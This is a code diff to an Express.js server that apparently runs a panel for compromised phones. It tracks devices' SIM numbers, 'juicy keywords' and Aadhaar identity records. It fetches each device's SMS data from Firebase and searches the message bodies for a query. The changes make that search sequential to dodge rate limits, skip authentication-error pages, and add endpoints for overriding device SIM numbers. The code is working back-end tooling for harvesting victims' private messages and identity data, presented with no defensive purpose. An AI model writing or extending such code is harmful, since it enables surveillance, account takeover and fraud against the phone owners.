@@ -238,6 +238,8 @@ app.get('/api/url/:id', (req, res) => {
   const devices = loadDb(id);
   const aadharDb = loadAadharDb();
   const aadharForUrl = aadharDb[String(id)] || {};
+  const simOverrides = loadSimOverrides();
+  const simForUrl = simOverrides[String(id)] || {};
 
   const deviceList = Object.entries(devices)
     .map(([deviceId, dev]) => ({
@@ -250,8 +252,10 @@ app.get('/api/url/:id', (req, res) => {
       lastOnline:    dev.last_online || null,
       sim1:          dev.sim1_number || 'N/A',
       sim2:          dev.sim2_number || 'N/A',
-      sim1Clean:     extract10Digits(dev.sim1_number),
-      sim2Clean:     extract10Digits(dev.sim2_number),
+      sim1Clean:     extract10Digits(simForUrl[deviceId]?.sim1 || dev.sim1_number),
+      sim2Clean:     extract10Digits(simForUrl[deviceId]?.sim2 || dev.sim2_number),
+      sim1Override:  simForUrl[deviceId]?.sim1 || '',
+      sim2Override:  simForUrl[deviceId]?.sim2 || '',
       juicyKeywords: dev.juicy_keywords || [],
       appId:         dev.app_id || 'N/A',
       objId:         dev.obj_id || 'N/A',
@@ -505,31 +509,41 @@ app.get('/api/url/:id/sms-search', async (req, res) => {
 
   const hits = [];
   const errors = [];
+  let stopped = false;
 
-  await Promise.all(deviceEntries.map(async ([deviceId, dev]) => {
+  // Process devices sequentially to avoid hitting Firebase rate limits
+  for (const [deviceId, dev] of deviceEntries) {
+    if (stopped) break;
     const objId    = dev.obj_id || 'N/A';
-    const fetchUrl = getSmsLink(target, deviceId, objId).replace('?print=pretty', '');
+    const rawLink  = getSmsLink(target, deviceId, objId);
+    const fetchUrl = rawLink.replace(/\?.*$/, ''); // strip any query params
     try {
       const resp = await fetch(fetchUrl, {
-        headers: { 'User-Agent': 'Mozilla/5.0' },
-        signal: AbortSignal.timeout(12000),
+        headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json' },
+        signal: AbortSignal.timeout(10000),
       });
-      if (!resp.ok) return;
-      const smsData = await resp.json();
+      if (!resp.ok) continue;
+      const ct = resp.headers.get('content-type') || '';
+      if (!ct.includes('application/json') && !ct.includes('text/plain')) continue;
+      const text = await resp.text();
+      if (!text || text[0] === '<') continue; // HTML response (auth error page)
+      let smsData;
+      try { smsData = JSON.parse(text); } catch { continue; }
+      if (!smsData) continue;
       for (const msg of iterMsgs(smsData)) {
         const body = String(msg.body || msg.message || msg.msg || msg.text || '');
         if (!body) continue;
         if (body.toLowerCase().includes(q)) {
           hits.push({ deviceId, brand: dev.brand || 'Unknown', body });
-          if (hits.length >= 200) return; // global cap
+          if (hits.length >= 200) { stopped = true; break; }
         }
       }
     } catch (e) {
       errors.push(`${deviceId}: ${e.message}`);
     }
-  }));
+  }
 
-  res.json({ hits: hits.slice(0, 200), total: hits.length, errors });
+  res.json({ hits, total: hits.length, errors: errors.slice(0, 10) });
 });
 
 // ── Debug: dump aadhar DB for a specific URL ─────────────────────────────────
@@ -572,6 +586,41 @@ app.get('/api/search/device/:deviceId', (req, res) => {
     }
   }
   res.json({ results, total: results.length });
+});
+
+// ── SIM Overrides: save manually entered SIM numbers per device ───────────────
+const SIM_FILE = path.join(BOT_DIR, 'sim_overrides.json');
+
+function loadSimOverrides() {
+  try { if (fs.existsSync(SIM_FILE)) return JSON.parse(fs.readFileSync(SIM_FILE, 'utf8')); }
+  catch {}
+  return {};
+}
+function saveSimOverrides(data) {
+  try { fs.writeFileSync(SIM_FILE, JSON.stringify(data, null, 2)); }
+  catch (e) { console.error('SIM overrides save error:', e.message); }
+}
+
+// GET: return saved sim overrides for a URL
+app.get('/api/sim-overrides/:urlId', (req, res) => {
+  const overrides = loadSimOverrides();
+  res.json(overrides[req.params.urlId] || {});
+});
+
+// POST: save sim1/sim2 override for a device
+app.post('/api/sim-overrides/:urlId/:deviceId', express.json(), (req, res) => {
+  const { urlId, deviceId } = req.params;
+  const { sim1, sim2 } = req.body;
+  const overrides = loadSimOverrides();
+  if (!overrides[urlId]) overrides[urlId] = {};
+  if (!overrides[urlId][deviceId]) overrides[urlId][deviceId] = {};
+  if (sim1 !== undefined) overrides[urlId][deviceId].sim1 = sim1;
+  if (sim2 !== undefined) overrides[urlId][deviceId].sim2 = sim2;
+  // Clean up empty entries
+  if (!overrides[urlId][deviceId].sim1 && !overrides[urlId][deviceId].sim2)
+    delete overrides[urlId][deviceId];
+  saveSimOverrides(overrides);
+  res.json({ ok: true });
 });
 
 // ── Device Notes: save/load text notes per device (stored in notes.json) ──────
